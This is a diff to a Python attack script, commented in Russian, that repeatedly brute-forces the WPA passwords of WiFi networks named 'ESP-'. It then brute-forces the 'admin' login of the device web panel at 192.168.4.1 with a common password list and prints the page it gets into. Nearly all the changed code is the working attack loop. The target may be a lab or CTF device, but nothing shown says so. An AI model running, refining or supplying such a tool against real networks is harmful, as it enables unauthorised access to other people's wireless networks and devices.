@@ -4,10 +4,14 @@ from brute_force import brute_force_pass_site, brute_force_pass_wifi
 from wifi_connect import verify_connected
 
 # Параметры программы
-site_ip = "gw"
+site_ip = "192.168.4.1"
 wifi_pattern = "ESP-"
+passlist_name_wifi = "probable-v2-wpa-top62.txt"
+passlist_name_site = "probable-v2-wpa-top62.txt"
+default_sitelogin = "admin"
 
-def get_secret_info(response) -> list[str]:
+# Функция для вывода  содержимого страницы после получения доступа
+def get_info_from_site(response) -> list[str]:
     soup = BeautifulSoup(response.text, 'html.parser')
 
     values = soup.find_all("div", attrs={"class": "value"})
@@ -19,28 +23,30 @@ def get_secret_info(response) -> list[str]:
 def main():
     try:
         while True:
-            # 1. Brute force password wifi
-            ssid, _ = brute_force_pass_wifi("ESP32-", "rockyou.txt")
+            # 1. Подбор пароля WiFi
+
+            ssid = brute_force_pass_wifi(wifi_pattern, passlist_name_wifi)
             if not ssid:
                 print("No wifi found, retrying...")
                 continue
-            session, csrf_token = None, None
+            session = None
+
             while verify_connected(ssid):
                 print("Watting attack...")
-                api_url = f"http://192.168.4.1"
                 if not session:
-                    # 2. Brute force password site
-                    session, password = brute_force_pass_site(api_url, "rockyou.txt")
+
+                    # 2. Подбор пароля как сайту
+                    session, password = brute_force_pass_site(site_ip, default_sitelogin, passlist_name_site)
                     if session is None:
                         continue
                 try:
-                    response = session.post("http://192.168.4.1/check", data={'username': 'daicaduy',
-                                                                               'password': password})#, headers={"csrf-token": csrf_token})
-                    #datas = get_secret_info(response)
+                    # 3. Выводим содержимое страницы при удачном подлкючении
+                    response = session.post("http://192.168.4.1/check", data={'username': default_sitelogin, 'password': password})
                     print(response.text)
+
                 except requests.RequestException as e:
                     print("The connection is interrupted, is connecting...")
-                    session, csrf_token = None, None
+                    session = None
     except KeyboardInterrupt:
         print("Exiting...")
 
